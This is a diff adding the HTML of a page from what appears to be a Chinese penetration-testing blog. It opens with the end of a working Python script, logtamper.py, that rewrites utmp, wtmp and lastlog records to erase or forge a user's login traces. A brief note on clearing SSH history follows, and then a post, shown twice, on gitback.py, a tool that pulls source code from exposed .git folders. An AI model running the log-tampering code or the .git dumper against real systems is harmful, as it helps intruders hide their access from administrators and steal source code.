+        showMessage<span class="token punctuation">(</span><span class="token string">'No such user.'</span><span class="token punctuation">)</span>
+ 
+    timestamp <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        str2time <span class="token operator">=</span> strptime<span class="token punctuation">(</span>strtime<span class="token punctuation">,</span> <span class="token string">'%Y:%m:%d:%H:%M:%S'</span><span class="token punctuation">)</span>
+        timestamp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mktime<span class="token punctuation">(</span>str2time<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        showMessage<span class="token punctuation">(</span><span class="token string">'Time format err.'</span><span class="token punctuation">)</span>
+ 
+    data <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
+        fp<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>LAST_STRUCT_SIZE <span class="token operator">*</span> p<span class="token punctuation">.</span>pw_uid<span class="token punctuation">)</span>
+        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
+    <span class="token keyword">finally</span><span class="token punctuation">:</span>
+        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token boolean">True</span>
+ 
+ 
+<span class="token keyword">def</span> <span class="token function">showMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span> msg
+    exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+ 
+ 
+<span class="token keyword">def</span> <span class="token function">saveFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> contents<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w+b'</span><span class="token punctuation">)</span>
+        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>contents<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        showMessage<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+    <span class="token keyword">finally</span><span class="token punctuation">:</span>
+        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ 
+ 
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    usage <span class="token operator">=</span> 'usage<span class="token punctuation">:</span> logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">2</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span>\n \
+        logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">3</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span> <span class="token operator">-</span>t tty1 <span class="token operator">-</span>d <span class="token number">2015</span><span class="token punctuation">:</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token number">12</span>'
+    parser <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span>usage<span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-m'</span><span class="token punctuation">,</span> <span class="token string">'--mode'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'MODE'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'1'</span> <span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'1: utmp, 2: wtmp, 3: lastlog [default: 1]'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--ttyname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TTYNAME'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span> <span class="token string">'--filename'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'FILENAME'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--username'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'USERNAME'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-i'</span><span class="token punctuation">,</span> <span class="token string">'--hostname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'HOSTNAME'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--dateline'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'DATELINE'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">(</span>options<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ 
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
+ 
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> UTMPFILE
+ 
+            <span class="token comment"># tamper</span>
+            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
+            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
+ 
+        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
+ 
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> WTMPFILE
+ 
+            <span class="token comment"># tamper</span>
+            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
+            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
+ 
+        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>TTYNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>DATELINE <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
+ 
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> LASTLOGFILE
+ 
+            <span class="token comment"># tamper</span>
+            modifyLast<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>TTYNAME <span class="token punctuation">,</span> options<span class="token punctuation">.</span>DATELINE<span class="token punctuation">)</span>
+ 
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>====<br>更新：</p>
+<p>上面的可以在debain系使用，感觉下面这种方法更通用：<br>有两种方式:</p>
+<ol>
+<li>修改<code>/etc/ssh/ssh_config</code>或者 <code>~/.ssh/config</code> 配置文件:</li>
+</ol>
+<p>Host *</p>
+	
+	</div>
+  <a type="button" href="/2016/04/13/clear-ssh-history.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2016/03/30/git-folder-exploit.html" >Git folder exploit</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-03-30  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/JKme/gitback">gitback.py</a></li>
+</ul>
+<p>当部署线上项目的时候可能会把git代码仓库一起部署上去，造成的结果就是<code>.git</code>文件夹泄漏，由此可以根据<code>.git/index</code>来知道对应的压缩文件名字，下载之后解压缩即可得到源代码。这个程序是根据lijiejie的<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">githack</a>更改过来的。</p>
+<p>因为<code>githack</code>使用的是socket直接read(）之后解压缩，如果文件太大会造成卡死。不管是<code>githack</code>还是<code>rip-git</code>，在下载文件的时候，如果文件不存在，而且服务器设置了302跳转的话，就会下载跳转那个页面，最后会导致下载好多重复文件。</p>
+<p>所以我在源代码的基础上更改了下，先下载git压缩文件，然后再解压缩到对应的名称，如果文件不存在，服务器跳转，就pass。中间碰到几个问题如下：</p>
+<h2 id="使用requests碰到的问题"><a href="#使用requests碰到的问题" class="headerlink" title="使用requests碰到的问题"></a>使用requests碰到的问题</h2><h4 id="timeout"><a href="#timeout" class="headerlink" title="timeout()"></a>timeout()</h4><ul>
+<li><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/17782142/why-doesnt-requests-get-return-what-is-the-default-timeout-that-requests-get">stackoverflow</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/kevinburke/requests/blob/connect-timeout/docs/user/advanced.rst#timeouts">官方文档</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/kennethreitz/requests/pull/1801">Issue</a></li>
+</ul>
+<p> 简单来说，<code>Timeouts</code>可以是一个元组，第一个数值代表的是<code>connect</code>的<code>timeout</code>，第二个数值表示<code>read</code>的<code>timeout</code>，在这里<code>read</code>的<code>timeout</code>表示的是<strong>is the     number of seconds the client will wait for the     server to send a response,(Specifically, it’s the     number of seconds that the client will wait     between bytes sent from the server. In practice,     this is the time before the server sends the first     byte)</strong></p>
+<h4 id="下载大文件"><a href="#下载大文件" class="headerlink" title="下载大文件"></a>下载大文件</h4><p>使用requests，所以下载的时候不需要担心steam=True的情况，直接使用。</p>
+	
+
+	</div>
+  <a type="button" href="/2016/03/30/git-folder-exploit.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/JKme/gitback">gitback.py</a></li>
+</ul>
+<p>当部署线上项目的时候可能会把git代码仓库一起部署上去，造成的结果就是<code>.git</code>文件夹泄漏，由此可以根据<code>.git/index</code>来知道对应的压缩文件名字，下载之后解压缩即可得到源代码。这个程序是根据lijiejie的<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">githack</a>更改过来的。</p>
+<p>因为<code>githack</code>使用的是socket直接read(）之后解压缩，如果文件太大会造成卡死。不管是<code>githack</code>还是<code>rip-git</code>，在下载文件的时候，如果文件不存在，而且服务器设置了302跳转的话，就会下载跳转那个页面，最后会导致下载好多重复文件。</p>
+<p>所以我在源代码的基础上更改了下，先下载git压缩文件，然后再解压缩到对应的名称，如果文件不存在，服务器跳转，就pass。中间碰到几个问题如下：</p>
+<h2 id="使用requests碰到的问题"><a href="#使用requests碰到的问题" class="headerlink" title="使用requests碰到的问题"></a>使用requests碰到的问题</h2><h4 id="timeout"><a href="#timeout" class="headerlink" title="timeout()"></a>timeout()</h4><ul>
+<li><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/17782142/why-doesnt-requests-get-return-what-is-the-default-timeout-that-requests-get">stackoverflow</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/kevinburke/requests/blob/connect-timeout/docs/user/advanced.rst#timeouts">官方文档</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/kennethreitz/requests/pull/1801">Issue</a></li>
+</ul>
+<p> 简单来说，<code>Timeouts</code>可以是一个元组，第一个数值代表的是<code>connect</code>的<code>timeout</code>，第二个数值表示<code>read</code>的<code>timeout</code>，在这里<code>read</code>的<code>timeout</code>表示的是<strong>is the     number of seconds the client will wait for the     server to send a response,(Specifically, it’s the     number of seconds that the client will wait     between bytes sent from the server. In practice,     this is the time before the server sends the first     byte)</strong></p>
+<h4 id="下载大文件"><a href="#下载大文件" class="headerlink" title="下载大文件"></a>下载大文件</h4><p>使用requests，所以下载的时候不需要担心steam=True的情况，直接使用。</p>
+	
+	</div>
+  <a type="button" href="/2016/03/30/git-folder-exploit.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/18/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+          <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
+		
+			<li><a href="/categories/Fun/">Fun<span>4</span></a></li>
+		
+			<li><a href="/categories/Java/">Java<span>8</span></a></li>
+		
+			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
+		
+			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
+		
+			<li><a href="/categories/Python/">Python<span>5</span></a></li>
+		
+			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+		
+			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
+      </li>
+    
+      <li>
+        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
+      </li>
+    
+      <li>
+        <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
+      </li>
+    
+      <li>
+        <a href="/2022/06/23/java-agent-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(4)-Java Agent</a>
+      </li>
+    
+      <li>
+        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
